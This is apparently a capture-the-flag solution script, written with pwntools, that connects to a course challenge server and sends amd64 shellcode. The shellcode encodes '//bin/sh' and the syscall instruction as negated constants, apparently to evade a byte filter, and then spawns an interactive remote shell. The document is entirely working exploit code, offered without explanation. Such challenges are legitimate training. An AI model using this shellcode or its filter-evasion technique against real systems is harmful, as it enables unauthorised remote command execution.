from pwn import *

arch = context.update(arch='amd64', os='linux')
r = remote('edu-ctf.csie.org', 10150)

r.recvline()

shellcode = """
_start:

xor rdx, rdx
xor rsi, rsi
mov r8, 0xff978cd091969dd1
neg r8
push r8
push rsp
pop rdi
push 0x3b
pop rax
mov r9, 0xfffffffffffffaf1
neg r9
push r9
push rsp
pop r14

call r14

"""

payload = asm(shellcode, arch='amd64')

r.send(payload)

r.interactive()
